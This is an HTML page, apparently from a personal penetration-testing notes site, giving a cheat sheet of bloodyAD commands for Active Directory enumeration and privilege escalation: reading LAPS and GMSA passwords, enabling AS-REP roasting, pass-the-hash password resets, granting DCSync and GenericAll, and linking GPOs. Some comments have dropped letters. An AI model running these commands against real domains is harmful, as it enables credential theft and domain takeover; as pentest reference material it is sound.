@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>ovelny - chaos/tool-cheat-sheets/bloodyAD</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta
+      name="description"
+      content="ovelny - notes on infosec, penetration testing, programming and others"
+    />
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
+    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
+    <link
+      href="/atom.xml"
+      rel="alternate"
+      title="ovelny"
+      type="application/atom+xml"
+    />
+    <script src="/assets/js/scramble-text.min.js" defer></script>
+    <script src="/assets/js/zoom-images.min.js" defer></script>
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:site" content="@ovelny"/>
+    <meta name="twitter:title" content="ovelny - chaos/tool-cheat-sheets/bloodyAD"/>
+    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
+    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
+  </head>
+  <body>
+
+    <header>
+      <section>
+        <a href="/">
+          <img
+            class="logo"
+            src="/assets/images/ovelny-pfp.png"
+            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
+          />
+        </a>
+        <h2><a class="ovelny" href="/">ovelny</a></h2>
+      </section>
+      <nav>
+        <a href="/now/">now</a>
+        <a href="/chaos/">chaos</a>
+        <a href="/phasm/">phasm</a>
+        <a href="/support/">support</a>
+        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
+        <a href="/about/">about</a>
+      </nav>
+    </header>
+    <main>
+
+    
+    <h1>BloodyAD</h1>
+
+<p>BloodyAD is an Active Directory privesc swiss army knife.</p>
+
+<h2>Enumeration</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Get group members:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object Users <span class="nt">--attr</span> member 
+
+<span class="c"># Get minimumassword lengtholicy:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object <span class="s1">'DC=&lt;DC name&gt;,DC=local'</span> <span class="nt">--attr</span> minPwdLength
+
+<span class="c"># Get AD functional level:</span>
+bloodyAD <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object <span class="s1">'DC=&lt;DC name&gt;,DC=local'</span> <span class="nt">--attr</span> msDS-Behavior-Version
+
+<span class="c"># Get all users of the domain:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get children <span class="s1">'DC=&lt;DC name&gt;,DC=local'</span> <span class="nt">--type</span> user
+
+<span class="c"># Get all computers of the domain:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get children <span class="s1">'DC=&lt;DC name&gt;,DC=local'</span> <span class="nt">--type</span> computer
+
+<span class="c"># Get all containers of the domain:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get children <span class="s1">'DC=&lt;DC name&gt;,DC=local'</span> <span class="nt">--type</span> container
+
+<span class="c"># Get UserAccountControl flags:</span>
+bloodyAD <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object &lt;username&gt; <span class="nt">--attr</span> userAccountControl
+
+<span class="c"># Get AD DNS records:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; get dnsDump
+
+<span class="c"># Get user:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> get object administrator
+
+<span class="c"># Get member of group:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> get object <span class="s1">'Domain Admins'</span>
+</code></pre></div>
+
+<h2>Exploitation</h2>
+
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Enable DONT_REQ_PREAUTH for ASREPRoast:</span>
+bloodyAD <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; add uac &lt;username&gt; DONT_REQ_PREAUTH
+
+<span class="c"># Disable ACCOUNTDISABLE:</span>
+bloodyAD <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; remove uac &lt;username&gt; ACCOUNTDISABLE
+
+<span class="c"># Read GMSA accountassword:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object <span class="s1">'gmsaAccount$'</span> <span class="nt">--attr</span> msDS-ManagedPassword
+
+<span class="c"># Read LAPSassword:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object <span class="s1">'COMPUTER$'</span> <span class="nt">--attr</span> ms-Mcs-AdmPwd
+
+<span class="c"># Read quota for adding computer objects to domain:</span>
+bloodyAD <span class="nt">-u</span> &lt;username&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">--host</span> &lt;IP&gt; get object <span class="s1">'DC=&lt;DC name&gt;,DC=&lt;domain TLD&gt;'</span> <span class="nt">--attr</span> ms-DS-MachineAccountQuota
+
+<span class="c"># Add a new DNS entry:</span>
+bloodyAD <span class="nt">-u</span> stan.dard <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; add dnsRecord &lt;machine name&gt; &lt;IP&gt;
+
+<span class="c"># Remove a DNS entry:</span>
+bloodyAD <span class="nt">-u</span> stan.dard <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; remove dnsRecord &lt;machine name&gt; &lt;IP&gt;
+
+<span class="c"># Setassword for user:</span>
+bloodyAD <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> setassword &lt;target username&gt; &lt;target newassword&gt;
+
+<span class="c"># Add dcsync to object:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> add dcsync &lt;admin username&gt;
+
+<span class="c"># Add GenericAll to object:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> add genericAll MS01<span class="nv">$ </span>&lt;admin username&gt;
+
+<span class="c"># Add user to group:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;admin username&gt; <span class="nt">-p</span> :&lt;NT <span class="nb">hash</span><span class="o">&gt;</span> add groupMember <span class="s1">'&lt;group name&gt;'</span> &lt;target username&gt;
+
+<span class="c"># Linking GPO:</span>
+bloodyAD <span class="nt">-d</span> &lt;DC name&gt; <span class="nt">--host</span> &lt;IP&gt; <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> <span class="s1">'&lt;password&gt;'</span> <span class="nb">set </span>object SRV01<span class="nv">$ </span>GPLink <span class="nt">-v</span> <span class="nv">CN</span><span class="o">={</span>2AADC2C9-C75F-45EF-A002-A22E1893FDB5<span class="o">}</span>,CN<span class="o">=</span>POLICIES,CN<span class="o">=</span>SYSTEM,DC<span class="o">=</span>&lt;DC name&gt;,DC<span class="o">=</span>&lt;domain TLD&gt;
+</code></pre></div>
+
+<h2>References</h2>
+
+<ul>
+<li><a href="https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad" rel="nofollow">https://notes.incendium.rocks/pentesting-notes/windows-pentesting/tools/bloodyad</a></li>
+</ul>
+
+    
+    </main>
+    <footer id="footer">
+      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
+      <div class="footer-section">「七転び八起き」</div>
+    </footer>
+  </body>
+</html>
+
